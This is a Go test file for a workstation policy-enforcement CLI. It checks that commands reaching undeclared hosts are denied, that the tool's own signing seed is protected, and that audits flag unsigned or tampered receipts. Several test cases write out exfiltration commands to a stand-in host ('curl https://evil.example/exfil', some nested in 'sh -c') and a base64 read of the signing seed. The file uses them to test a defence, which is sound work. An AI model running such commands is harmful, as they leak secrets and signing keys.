// quantum_posture: these tests exercise workstation receipts signed with the
// classical Ed25519 workstation seed; no post-quantum primitive is involved.

package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Mindburn-Labs/helm-ai-kernel/core/pkg/contracts"
	"github.com/Mindburn-Labs/helm-ai-kernel/core/pkg/workstation"
)

// enforceShim puts fake network clients first on PATH. Each one only records
// that it ran, so a test can prove whether enforce executed the command
// without any real connection being made.
func enforceShim(t *testing.T, names ...string) (marker string) {
	t.Helper()
	dir := t.TempDir()
	marker = filepath.Join(dir, "executed")
	script := "#!/bin/sh\necho \"$0 $*\" >> '" + marker + "'\n"
	for _, name := range names {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(script), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	return marker
}

func enforceArgs(dataDir, profile string, rest ...string) []string {
	args := []string{"helm-ai-kernel", "workstation", "enforce", "--data-dir", dataDir, "--receipt-dir", filepath.Join(dataDir, "enforce-receipts")}
	if profile != "" {
		args = append(args, "--policy-profile", profile)
	}
	return append(args, rest...)
}

func enforceReceipts(t *testing.T, dataDir string) []contracts.WorkstationPolicyDecisionReceipt {
	t.Helper()
	paths, err := filepath.Glob(filepath.Join(dataDir, "enforce-receipts", "*.json"))
	if err != nil {
		t.Fatal(err)
	}
	receipts := make([]contracts.WorkstationPolicyDecisionReceipt, 0, len(paths))
	for _, path := range paths {
		receipts = append(receipts, readDecisionReceipt(t, path))
	}
	return receipts
}

// The wrapper decides on the command it is about to run. A declared class and
// target that describe some other command cannot authorize it.
func TestWorkstationEnforceDecidesOnTheArgvItRuns(t *testing.T) {
	allow := filepath.Join(kernelRepoRoot(t), "fixtures", "workstation", "policies", "observe_draft.v1.allow.json")
	cases := []struct {
		name     string
		args     []string
		wantRun  bool
		wantCode int
		reason   string // receipt reason code a refusal must carry; "" when the refusal has no receipt
		stderr   string
	}{
		{
			name:     "declared target is not where the command connects",
			args:     []string{"--class", "network", "--target", "https://api.github.com/zen", "--", "curl", "https://evil.example/exfil"},
			wantCode: 126, reason: "EGRESS_DESTINATION_NOT_ALLOWED",
		},
		{
			name:     "command reaches a second destination",
			args:     []string{"--class", "network", "--target", "https://api.github.com/zen", "--", "curl", "https://api.github.com/zen", "https://evil.example/exfil"},
			wantCode: 126, reason: "EGRESS_DESTINATION_NOT_ALLOWED",
		},
		{
			name:     "declared class hides a network command",
			args:     []string{"--class", "shell-operate", "--", "curl", "https://evil.example/exfil"},
			wantCode: 126, reason: "EGRESS_DESTINATION_NOT_ALLOWED",
		},
		{
			name:     "nested shell reaches another host",
			args:     []string{"--class", "network", "--target", "https://api.github.com/zen", "--", "sh", "-c", "curl https://evil.example/exfil"},
			wantCode: 126, reason: "EGRESS_DESTINATION_NOT_ALLOWED",
		},
		{
			name:     "destination is computed inside the command",
			args:     []string{"--class", "network", "--target", "https://api.github.com/zen", "--", "sh", "-c", "curl \"$URL\""},
			wantCode: 126, reason: "EGRESS_DESTINATION_UNDETERMINED",
		},
		{
			name:     "declared network target with a command that shows no destination",
			args:     []string{"--class", "network", "--target", "https://api.github.com/zen", "--", "python3", "fetch.py"},
			wantCode: 126, stderr: "cannot confirm",
		},
		{
			name:     "declared target is not the command",
			args:     []string{"--class", "shell-operate", "--target", "echo harmless", "--", "curl", "--version"},
			wantCode: 126, stderr: "does not match",
		},
		{
			name:    "declared target matches the command",
			args:    []string{"--class", "network", "--target", "https://api.github.com/zen", "--", "curl", "-sS", "https://api.github.com/zen"},
			wantRun: true,
		},
		{
			name:    "network class without a declared target takes the destination from the command",
			args:    []string{"--class", "network", "--", "curl", "https://api.github.com/zen"},
			wantRun: true,
		},
		{
			name:    "plain operate command",
			args:    []string{"--class", "shell-operate", "--", "python3", "build.py"},
			wantRun: true,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			marker := enforceShim(t, "curl", "python3")
			dataDir := filepath.Join(t.TempDir(), "helm")
			var stdout, stderr bytes.Buffer
			code := Run(enforceArgs(dataDir, allow, tc.args...), &stdout, &stderr)
			_, statErr := os.Stat(marker)
			ran := statErr == nil
			if ran != tc.wantRun {
				t.Fatalf("command executed = %v, want %v (exit %d stdout=%s stderr=%s)", ran, tc.wantRun, code, stdout.String(), stderr.String())
			}
			if code != tc.wantCode {
				t.Fatalf("exit = %d, want %d (stdout=%s stderr=%s)", code, tc.wantCode, stdout.String(), stderr.String())
			}
			receipts := enforceReceipts(t, dataDir)
			if tc.reason != "" {
				found := false
				for _, receipt := range receipts {
					if receipt.Verdict == contracts.WorkstationVerdictDeny && receipt.ReasonCode == tc.reason {
						found = true
					}
				}
				if !found {
					t.Fatalf("no DENY/%s receipt among %+v", tc.reason, receipts)
				}
			}
			if tc.stderr != "" && !strings.Contains(stderr.String(), tc.stderr) {
				t.Fatalf("stderr = %q, want it to contain %q", stderr.String(), tc.stderr)
			}
			if tc.wantRun {
				if len(receipts) == 0 {
					t.Fatal("command ran without a persisted receipt")
				}
				for _, receipt := range receipts {
					if receipt.Verdict != contracts.WorkstationVerdictAllow || receipt.Request.EffectMode != contracts.WorkstationEffectModeOperate {
						t.Fatalf("command ran on a receipt that is not an operate-mode ALLOW: %+v", receipt)
					}
					if receipt.Request.Metadata["argv_sha256"] == "" {
						t.Fatalf("receipt does not bind the argv it authorized: %+v", receipt.Request.Metadata)
					}
				}
			}
		})
	}
}

func TestWorkstationEnforceProtectsItsOwnSigningMaterial(t *testing.T) {
	allow := filepath.Join(kernelRepoRoot(t), "fixtures", "workstation", "policies", "observe_draft.v1.allow.json")
	marker := enforceShim(t, "base64")
	dataDir := filepath.Join(t.TempDir(), "helm")
	var stdout, stderr bytes.Buffer
	code := Run(enforceArgs(dataDir, allow, "--class", "shell-operate", "--", "base64", workstationSigningSeedPath(dataDir)), &stdout, &stderr)
	if _, err := os.Stat(marker); err == nil {
		t.Fatalf("enforce ran a command over its own signing seed (exit %d)", code)
	}
	if code != 126 {
		t.Fatalf("exit = %d, want 126 (stdout=%s stderr=%s)", code, stdout.String(), stderr.String())
	}
	found := false
	for _, receipt := range enforceReceipts(t, dataDir) {
		if receipt.Verdict == contracts.WorkstationVerdictDeny && receipt.ReasonCode == "TRUST_MATERIAL_ACCESS_DENIED" {
			found = true
		}
	}
	if !found {
		t.Fatalf("no DENY/TRUST_MATERIAL_ACCESS_DENIED receipt (stdout=%s stderr=%s)", stdout.String(), stderr.String())
	}
}

// receiptInputs writes one receipt signed by the local signer, one with no
// signature and one whose content was changed after signing.
func receiptInputs(t *testing.T) (dir, dataDir string) {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	dataDir = filepath.Join(home, ".helm-ai-kernel")
	dir = t.TempDir()
	signed := filepath.Join(dir, "signed.json")
	var stdout, stderr bytes.Buffer
	if code := Run([]string{"helm-ai-kernel", "workstation", "decide", "--class", "network", "--target", "https://signed.example", "--run-id", "run-signed", "--out", signed, "--data-dir", dataDir}, &stdout, &stderr); code != 0 {
		t.Fatalf("decide exit = %d stderr = %s", code, stderr.String())
	}
	raw, err := os.ReadFile(signed)
	if err != nil {
		t.Fatal(err)
	}
	var unsigned map[string]any
	if err := json.Unmarshal(raw, &unsigned); err != nil {
		t.Fatal(err)
	}
	unsigned["decision_id"] = "wpd_unsigned"
	unsigned["signature"] = ""
	unsigned["signer_key_id"] = ""
	unsigned["request"].(map[string]any)["run_id"] = "run-unsigned"
	unsigned["request"].(map[string]any)["target"] = "https://unsigned.example"
	writeTestJSON(t, filepath.Join(dir, "unsigned.json"), unsigned)

	tampered := strings.Replace(string(raw), "run-signed", "run-tampered", 1)
	tampered = strings.Replace(tampered, "https://signed.example", "https://tampered.example", 1)
	if err := os.WriteFile(filepath.Join(dir, "tampered.json"), []byte(tampered), 0o600); err != nil {
		t.Fatal(err)
	}
	return dir, dataDir
}

func writeTestJSON(t *testing.T, path string, value any) {
	t.Helper()
	data, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestWorkstationListSaysWhichReceiptsItChecked(t *testing.T) {
	dir, _ := receiptInputs(t)

	var stdout, stderr bytes.Buffer
	if code := Run([]string{"helm-ai-kernel", "workstation", "list", "--input", dir, "--json"}, &stdout, &stderr); code != 0 {
		t.Fatalf("list --json exit = %d stderr = %s", code, stderr.String())
	}
	var runs []map[string]any
	if err := json.Unmarshal(stdout.Bytes(), &runs); err != nil {
		t.Fatalf("list JSON: %v\n%s", err, stdout.String())
	}
	status := map[string]string{}
	for _, run := range runs {
		status[run["run_id"].(string)], _ = run["signature_status"].(string)
	}
	want := map[string]string{
		"run-signed":   "signed_by_trusted_key",
		"run-unsigned": "unsigned",
		"run-tampered": "invalid_signature",
	}
	for runID, wantStatus := range want {
		if status[runID] != wantStatus {
			t.Errorf("run %s signature_status = %q, want %q (all: %v)", runID, status[runID], wantStatus, status)
		}
	}

	stdout.Reset()
	stderr.Reset()
	if code := Run([]string{"helm-ai-kernel", "workstation", "list", "--input", dir}, &stdout, &stderr); code != 0 {
		t.Fatalf("list exit = %d stderr = %s", code, stderr.String())
	}
	for _, phrase := range []string{"signed_by_trusted_key", "unsigned", "invalid_signature", "Signatures:"} {
		if !strings.Contains(stdout.String(), phrase) {
			t.Errorf("list output does not say %q:\n%s", phrase, stdout.String())
		}
	}

	stdout.Reset()
	stderr.Reset()
	if code := Run([]string{"helm-ai-kernel", "workstation", "denied", "--input", dir, "--json"}, &stdout, &stderr); code != 0 {
		t.Fatalf("denied exit = %d stderr = %s", code, stderr.String())
	}
	if strings.Contains(stdout.String(), "unsigned.example") || strings.Contains(stdout.String(), "tampered.example") {
		t.Errorf("denied timeline reports on receipts whose signature does not hold:\n%s", stdout.String())
	}
	if !strings.Contains(stdout.String(), "signed.example") {
		t.Errorf("denied timeline lost the signed receipt:\n%s", stdout.String())
	}
}

func TestAuditScopeSaysWhichReceiptsItChecked(t *testing.T) {
	dir, dataDir := receiptInputs(t)

	var stdout, stderr bytes.Buffer
	if code := Run([]string{"helm-ai-kernel", "audit", "scope", "--input", dir, "--json"}, &stdout, &stderr); code != 0 {
		t.Fatalf("audit scope exit = %d stderr = %s", code, stderr.String())
	}
	var report workstation.ScopeAuditReport
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatalf("scope audit JSON: %v\n%s", err, stdout.String())
	}
	if report.Summary.InputFiles != 3 || report.Summary.DecisionReceipts != 1 || report.Summary.DeniedActions != 1 {
		t.Fatalf("summary = %+v, want three inputs and one counted receipt", report.Summary)
	}
	if strings.Contains(stdout.String(), "unsigned.example") || strings.Contains(stdout.String(), "tampered.example") {
		t.Fatalf("scope audit reports on receipts whose signature does not hold:\n%s", stdout.String())
	}
	limitations := strings.Join(report.Limitations, "\n")
	for _, phrase := range []string{"unsigned.json", "tampered.json", "not counted", workstationSigningPublicKeyPath(dataDir)} {
		if !strings.Contains(limitations, phrase) {
			t.Errorf("limitations do not mention %q:\n%s", phrase, limitations)
		}
	}

	stdout.Reset()
	stderr.Reset()
	if code := Run([]string{"helm-ai-kernel", "audit", "scope", "--input", dir}, &stdout, &stderr); code != 0 {
		t.Fatalf("audit scope summary exit = %d stderr = %s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "signatures:") || !strings.Contains(stdout.String(), "not counted") {
		t.Errorf("audit summary does not say what was checked:\n%s", stdout.String())
	}

	// Without an anchor the report must say that signer trust was not checked.
	stdout.Reset()
	stderr.Reset()
	emptyData := filepath.Join(t.TempDir(), "no-anchor")
	if code := Run([]string{"helm-ai-kernel", "audit", "scope", "--input", filepath.Join(dir, "signed.json"), "--data-dir", emptyData, "--json"}, &stdout, &stderr); code != 0 {
		t.Fatalf("audit scope without anchor exit = %d stderr = %s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "Signer trust was not checked") {
		t.Errorf("scope audit without a trust anchor does not say so:\n%s", stdout.String())
	}

	// When nothing verifies there is nothing to audit.
	stdout.Reset()
	stderr.Reset()
	if code := Run([]string{"helm-ai-kernel", "audit", "scope", "--input", filepath.Join(dir, "unsigned.json")}, &stdout, &stderr); code != 1 || !strings.Contains(stderr.String(), "signature") {
		t.Errorf("audit scope over only an unsigned receipt: exit=%d stderr=%s, want a refusal that names the signature", code, stderr.String())
	}
}
